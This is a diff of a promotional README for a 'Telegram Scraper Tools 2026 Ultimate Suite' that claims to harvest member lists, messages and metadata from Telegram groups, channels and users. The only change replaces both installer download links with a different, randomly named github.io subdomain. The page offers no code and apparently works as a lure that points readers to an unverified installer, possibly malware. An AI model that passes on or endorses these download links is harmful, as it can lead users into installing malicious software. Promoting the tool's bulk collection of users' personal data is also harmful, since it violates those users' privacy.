@@ -2,7 +2,7 @@
 
 Telegram Scraper Tools 2026 Ultimate Suite is a powerful and versatile software designed for extracting and analyzing data from various Telegram entities, including groups, channels, and individual users. With its advanced algorithms and user-centric design, this tool enables efficient data collection and parsing, making it ideal for researchers, marketers, and developers. Whether you need to gather member information, track activity, or compile datasets, Telegram Scraper Tools provides a comprehensive solution for all your scraping needs.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 - **Comprehensive Data Extraction**: Extract detailed information from Telegram groups and channels, such as member lists, messages, and metadata, with high accuracy and speed.
@@ -38,4 +38,4 @@ Before installing Telegram Scraper Tools 2026 Ultimate Suite, ensure your system
 ## Download
 For the latest version of Telegram Scraper Tools 2026 Ultimate Suite, please visit the official download page. You can access it directly using the link below:
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
